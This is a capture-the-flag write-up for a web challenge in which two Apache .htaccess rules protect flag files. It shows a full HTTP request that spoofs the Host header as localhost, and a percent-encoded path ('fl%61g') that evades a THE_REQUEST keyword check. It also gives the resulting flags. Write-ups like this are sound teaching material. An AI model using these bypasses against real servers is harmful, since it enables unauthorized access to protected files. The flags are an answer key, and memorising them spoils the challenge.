# Tags
- htaccess

# Intro

Your job is to bypass these htaccess restrictions and view the flag files anyway. Good luck!

The page shows the following information:


Helicoptering

The two parts of the flag are available at the locations below:

    part one
    part two

Unfortunately, they are both protected by an .htaccess file:
one/.htaccess

RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
    

two/.htaccess

RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
    

Your job is to bypass these restrictions and view the flag files anyway. Good luck!

# Solution: part 1

The first condition was easy, just change the host header to localhost

GET /one/flag.txt HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://htaccess.uctf.ir/
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

Flag: `uctf{Sule_`


# Solution: part 2

THE_REQUEST variable represents original request received by Apache from your browser and it doesn't get overwritten after execution of some rewrite rules. 
The THE_REQUEST server variable contains the initial request header of the form: GET /two/flag.txt HTTP/1.1

If there is a condition like: `RewriteCond %{THE_REQUEST} flag` it can be bypassed by using percent encoding.
Since THE_REQUEST brings the HTTP header: `GET /two/flag.txt HTTP/1.1`, we can bypass it by encoding the "a" character like: %61.
Using the final payload: `GET /two/fl%61g.txt HTTP/1.1`, we get the flag: `Dukol_waterfall}`


`uctf{Sule_Dukol_waterfall}`